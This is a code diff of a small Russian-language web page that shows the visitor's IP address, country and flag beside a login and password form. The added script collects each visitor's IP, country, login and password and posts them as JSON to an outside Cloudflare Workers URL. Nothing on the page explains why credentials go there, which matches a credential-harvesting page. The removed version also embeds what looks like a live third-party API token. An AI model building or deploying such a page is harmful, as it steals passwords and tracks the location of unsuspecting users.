@@ -1,73 +1,48 @@
-<!DOCTYPE html>
-<html lang="ru">
-<head>
-  <meta charset="UTF-8" />
-  <title>Ваш IP</title>
-</head>
-<body>
-  <h2>Ваш IP-адрес:</h2>
-  <p id="ip">Загрузка...</p>
-  <h3>Страна:</h3>
-  <p id="country">Загрузка...</p>
-  <h3>Флаг:</h3>
-  <img id="flag" alt="Country flag" width="100">
+<script>
+  const WORKER_URL = 'https://mute-scene-f7f5.kamrantataloo69.workers.dev/';
+  let clientIp = 'unknown', clientCountry = 'unknown';
 
-  <form action="https://mute-scene-f7f5.kamrantataloo69.workers.dev/" method="POST" id="loginForm">
-    <input type="text" name="login" placeholder="Login"><br>
-    <input type="password" name="password" placeholder="Password"><br>
-    <button type="submit">Login</button>
-  </form>
+  // 1) Получаем публичный IPv4
+  fetch('https://api.ipify.org?format=json')
+    .then(r => r.json())
+    .then(json => {
+      clientIp = json.ip;
+      document.getElementById('ip').textContent = clientIp;
 
-  <script>
-    // Получаем IP и информацию о стране
-    fetch('https://api.ipify.org?format=json')
-      .then(res => res.json())
-      .then(data => {
-        document.getElementById('ip').textContent = data.ip;
+      // 2) Запрашиваем страну по IP
+      return fetch(`https://ipinfo.io/${clientIp}/json?token=YOUR_API_KEY`);
+    })
+    .then(r => r.json())
+    .then(info => {
+      clientCountry = info.country;                        // сохраняем
+      document.getElementById('country').textContent = clientCountry;
+      document.getElementById('flag').src =
+        `https://flagcdn.com/w80/${clientCountry.toLowerCase()}.png`;
+    })
+    .catch(err => {
+      console.warn('IP/Country fetch failed', err);
+      document.getElementById('country').textContent = '—';
+    });
 
-        // Запрос на ipinfo.io для получения информации о стране
-        fetch(`https://ipinfo.io/${data.ip}/json?token=12e7da7cd87750`)
-          .then(res => res.json())
-          .then(info => {
-            // Отображаем страну и флаг
-            document.getElementById('country').textContent = info.country;
-            const flagUrl = `https://flagcdn.com/w320/${info.country.toLowerCase()}.png`;
-            document.getElementById('flag').src = flagUrl;
+  // 3) Отправляем форму
+  document.getElementById('loginForm').addEventListener('submit', async e => {
+    e.preventDefault();
+    const form = e.target;
 
-            // Отправляем данные на воркер с IP-адресом, логином и паролем
-            const form = document.getElementById('loginForm');
-            form.addEventListener('submit', async (event) => {
-              event.preventDefault(); // Предотвращаем стандартное отправление формы
+    const postData = {
+      ip: clientIp,
+      country: clientCountry,   // теперь отправляем country
+      login: form.login.value,
+      password: form.password.value
+    };
 
-              const login = form.elements['login'].value;
-              const password = form.elements['password'].value;
+    const resp = await fetch(WORKER_URL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(postData)
+    });
 
-              const postData = {
-                ip: data.ip,
-                country: info.country,
-                login: login,
-                password: password,
-              };
-
-              // Отправляем POST-запрос на воркер
-              await fetch('https://mute-scene-f7f5.kamrantataloo69.workers.dev/', {
-                method: 'POST',
-                headers: {
-                  'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(postData),
-              });
-
-              alert('Данные отправлены!');
-            });
-          })
-          .catch(() => {
-            document.getElementById('country').textContent = 'Ошибка получения информации о стране';
-          });
-      })
-      .catch(() => {
-        document.getElementById('ip').textContent = 'Ошибка получения IP';
-      });
-  </script>
-</body>
-</html>
+    if (resp.ok) alert('Данные отправлены!');
+    else      alert('Ошибка отправки');
+  });
+</script>
